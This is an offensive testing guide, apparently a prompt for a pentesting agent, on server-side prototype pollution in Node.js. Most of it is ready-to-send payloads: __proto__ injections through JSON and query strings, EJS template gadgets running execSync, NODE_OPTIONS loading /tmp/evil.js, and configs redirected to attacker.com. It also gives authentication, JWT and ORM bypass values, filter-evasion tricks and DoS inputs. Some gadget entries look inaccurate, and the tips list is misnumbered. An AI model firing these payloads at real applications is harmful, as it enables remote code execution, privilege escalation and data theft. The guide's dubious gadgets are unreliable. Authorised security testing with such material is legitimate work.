<server_side_prototype_pollution_guide>
<title>SERVER-SIDE PROTOTYPE POLLUTION (Node.js Specific)</title>

<critical>Server-side prototype pollution in Node.js enables property injection into Object.prototype, leading to authentication bypass, privilege escalation, RCE via gadget chains, and DoS. Unlike client-side PP, server exploitation affects all requests and can compromise the entire application. Focus on merge operations, JSON parsing, and gadget chain discovery.</critical>

<scope>
- __proto__ pollution via JSON.parse, merge utilities, query string parsing
- constructor.prototype manipulation for alternative pollution vectors
- RCE gadget chains (child_process, vm module, require, eval)
- Template engine gadgets (EJS, Pug, Handlebars, Nunjucks)
- Environment variable overwrite (process.env pollution)
- AST injection patterns (parser pollution)
- Authentication/authorization bypass via polluted properties
- DoS via property collision and resource exhaustion
</scope>

<methodology>
1. Identify merge/clone operations on user input (lodash merge, Object.assign, spread operator misuse)
2. Test prototype pollution vectors: __proto__, constructor.prototype, constructor[prototype]
3. Detect pollution: inject a canary property and check for global leakage
4. Enumerate gadgets: analyze code for child_process, vm, eval, template engines
5. Build RCE chain: combine pollution vector with gadget to achieve code execution
6. Test persistence: verify pollution survives request lifecycle (global vs per-request)
7. Validate impact: demonstrate authentication bypass, RCE, or sensitive property override
</methodology>

<pollution_vectors>
<json_parsing>
- Direct JSON.parse with merge:
  JSON.parse('{"__proto__": {"isAdmin": true}}')
  const obj = {}; Object.assign(obj, userInput);
- Query string parsing:
  qs.parse('__proto__[isAdmin]=true')
  qs.parse('constructor[prototype][isAdmin]=true')
- Body parsing without protection:
  express.json() + lodash.merge(config, req.body)
</json_parsing>

<recursive_merge>
- lodash.merge, lodash.mergeWith (vulnerable by default)
  _.merge({}, JSON.parse(userInput))
- Custom merge functions without prototype checks
- Object.assign with nested objects (limited but possible)
- Spread operator with nested merge: {...a, ...userInput} if userInput has __proto__
</recursive_merge>

<alternative_vectors>
- constructor.prototype pollution:
  obj.constructor.prototype.isAdmin = true
- Constructor[prototype] with bracket notation:
  obj["constructor"]["prototype"]["isAdmin"] = true
- Polluting via Object.create and setPrototypeOf (rare but possible)
</alternative_vectors>

<path_traversal_style>
- Nested property paths:
  {"a": {"b": {"c": {"__proto__": {"polluted": true}}}}}
- Array index confusion:
  {"__proto__": [{"polluted": true}]}
- Mixed notation:
  {"constructor": {"prototype": {"isAdmin": true}}}
</path_traversal_style>
</pollution_vectors>

<detection_techniques>
<canary_injection>
- Inject unique property and test for global leakage:
  POST {"__proto__": {"canary123": "polluted"}}
  Then check: ({}).canary123 === "polluted"
- Time-based detection in sync code:
  Inject property that affects execution flow, measure timing difference
- Error-based detection:
  Pollute property used in error messages
</canary_injection>

<status_codes_response_diff>
- Pollute authentication properties:
  {"__proto__": {"isAdmin": true, "role": "admin"}}
  Check if auth checks now pass
- Response structure changes:
  Pollute properties used in response formatting
- Header injection:
  Pollute properties used in header construction
</status_codes_response_diff>

<gadget_probing>
- Test if child_process exists:
  {"__proto__": {"shell": "node", "argv0": "node"}}
- Test vm module options:
  {"__proto__": {"compileFunction": {"options": {}}}}
- Test eval-based gadgets:
  Pollute properties that end up in eval() or Function()
</gadget_probing>
</detection_techniques>

<rce_gadget_chains>
<child_process_gadgets>
- execSync/spawn options pollution:
  {"__proto__": {"shell": "node", "env": {"NODE_OPTIONS": "--require /tmp/evil.js"}}}
  {"__proto__": {"argv0": "node", "execArgv": ["--require=/tmp/evil.js"]}}
- Spawn shell option:
  child_process.spawn('cmd', [], {shell: true}) // pollute shell property
- Input encoding pollution:
  {"__proto__": {"input": "malicious"}}
</child_process_gadgets>

<vm_module_gadgets>
- vm.runInContext options:
  {"__proto__": {"filename": "/etc/passwd", "displayErrors": true}}
- vm.compileFunction:
  {"__proto__": {"cachedData": malicious_bytecode}}
- Context escape via prototype:
  Pollute properties used in context construction
</vm_module_gadgets>

<template_engine_gadgets>
<ejs>
- options.client pollution:
  {"__proto__": {"client": true, "escapeFunction": "1; return global.process.mainModule.require('child_process').execSync('whoami')"}}
- outputFunctionName pollution:
  {"__proto__": {"outputFunctionName": "x; return process.mainModule.require('child_process').execSync('whoami')//"}}
</ejs>

<pug>
- compileDebug pollution:
  {"__proto__": {"compileDebug": true, "self": true}}
- Inject code via debug options
</pug>

<handlebars>
- Pollute helpers:
  {"__proto__": {"lookupProperty": "return process"}}
- Runtime options pollution
</handlebars>

<nunjucks>
- Settings pollution:
  {"__proto__": {"settings": {"view cache": false}}}
</nunjucks>
</template_engine_gadgets>

<require_gadgets>
- Module.prototype.require:
  Pollute require resolution paths
- require.extensions:
  {"__proto__": {".js": malicious_handler}}
- require.cache pollution:
  Override cached modules
</require_gadgets>

<ast_injection>
- Parser options pollution:
  Pollute acorn/babel parser options
- Code generation options:
  Affect AST-to-code transformation
- Source map options:
  {"__proto__": {"sourceMappingURL": "http://attacker.com/evil.js"}}
</ast_injection>
</rce_gadget_chains>

<authentication_bypass>
<direct_property_pollution>
- isAdmin, isAuthenticated, role, permissions:
  {"__proto__": {"isAdmin": true}}
  {"__proto__": {"role": "admin", "permissions": ["*"]}}
- User object properties:
  {"__proto__": {"userId": 1, "username": "admin"}}
</direct_property_pollution>

<session_middleware_bypass>
- Express-session properties:
  {"__proto__": {"cookie": {"secure": false, "httpOnly": false}}}
- Passport.js properties:
  {"__proto__": {"user": {"id": 1, "role": "admin"}}}
</session_middleware_bypass>

<jwt_verification_bypass>
- jsonwebtoken options:
  {"__proto__": {"verify": {"ignoreExpiration": true, "algorithms": ["none"]}}}
- Signature verification bypass:
  {"__proto__": {"verify": false, "ignoreNotBefore": true}}
</jwt_verification_bypass>

<orm_query_manipulation>
- Sequelize/TypeORM where clause pollution:
  {"__proto__": {"where": "1=1"}}
- Mongoose query options:
  {"__proto__": {"lean": true, "$where": "return true"}}
</orm_query_manipulation>
</authentication_bypass>

<environment_pollution>
- process.env overwrite:
  {"__proto__": {"env": {"NODE_ENV": "development", "DEBUG": "*"}}}
- Config object pollution:
  {"__proto__": {"database": {"host": "attacker.com"}}}
- Feature flags:
  {"__proto__": {"features": {"newFeature": true, "adminPanel": true}}}
</environment_pollution>

<dos_attacks>
<property_collision>
- Pollute toString, valueOf:
  {"__proto__": {"toString": "[object Object]", "valueOf": 0}}
- Infinite recursion:
  {"__proto__": {"__proto__": {...}}}
</property_collision>

<resource_exhaustion>
- Large payloads:
  Deeply nested __proto__ chains
- Memory leak:
  Pollute properties that prevent garbage collection
</resource_exhaustion>
</dos_attacks>

<detection_payloads>
<basic_test>
POST /api/update
Content-Type: application/json
{"__proto__": {"polluted": true}}

Then test: ({}).polluted === true
</basic_test>

<query_string>
GET /api/search?__proto__[isAdmin]=true
GET /api/search?constructor[prototype][isAdmin]=true
GET /api/search?constructor.prototype.isAdmin=true
</query_string>

<nested_json>
POST /api/config
{
  "theme": {
    "color": "blue",
    "__proto__": {
      "isAdmin": true
    }
  }
}
</nested_json>

<url_encoded>
POST /api/update
Content-Type: application/x-www-form-urlencoded
__proto__[isAdmin]=true&__proto__[role]=admin
</url_encoded>
</detection_payloads>

<mitigation_bypass>
<frozen_objects>
- Object.freeze() only affects direct properties, not prototype
- Test pollution after freeze
</frozen_objects>

<json_schema_validation>
- Additional properties may be allowed
- __proto__ not explicitly blocked in schema
</json_schema_validation>

<sanitization_bypass>
- Case variations: __PROTO__, __Proto__
- Unicode: __proto__ with Unicode characters
- Encoding: URL encode, double encode
- Array notation: __proto__[0] vs __proto__
</sanitization_bypass>
</mitigation_bypass>

<validation>
1. Prove pollution: inject property via __proto__ and demonstrate global leakage
2. Show persistence: property remains polluted across requests (if global) or within request
3. Demonstrate impact: authentication bypass, RCE, or sensitive feature access
4. Provide RCE chain: full payload from pollution to command execution
5. Test cleanup: verify pollution persists or is cleaned up (affects severity)
6. Confirm gadget availability: prove vulnerable library/module exists in target
</validation>

<false_positives>
- Client-side prototype pollution (no server impact)
- Object.assign with flat objects (limited pollution capability)
- Proper input validation that blocks __proto__
- Frozen/sealed objects that prevent property addition
- Modern Node.js versions with prototype pollution protections
- Libraries with --frozen-intrinsics flag
</false_positives>

<impact>
- Remote Code Execution via gadget chains
- Authentication/authorization bypass (privilege escalation)
- Environment/config manipulation affecting all users
- Denial of Service via property collision
- Data exfiltration via polluted connection configs
- Cross-tenant data leakage in multi-tenant systems
</impact>

<pro_tips>
1. Test both __proto__ and constructor.prototype—some filters miss constructor variant
2. Query string parsing (qs, body-parser) is highly vulnerable—test GET params
3. lodash.merge is the most common gadget—look for merge operations in code
4. Check package.json for vulnerable lodash versions (<4.17.21)
4. EJS template pollution is very reliable—look for res.render() calls
6. Pollute options objects for child_process, vm, eval, require
7. Test environment pollution (process.env) for config manipulation
8. Combine with SSRF/XXE—pollute URL/path properties for outbound requests
9. Multi-step chains: pollute property A to enable gadget B
10. Check for frozen-intrinsics or Object.freeze usage (rare but effective mitigation)
11. Persistence matters: global pollution affects all users (critical), per-request is limited
12. Test error handlers—polluted properties in error objects may leak stack traces
</pro_tips>

<remember>Server-side prototype pollution requires deep merge operations on user-controlled objects. Prevent by using Map instead of objects, Object.create(null) for user data, or schema validation that explicitly blocks __proto__ and constructor. Gadget chains turn pollution into RCE.</remember>
</server_side_prototype_pollution_guide>
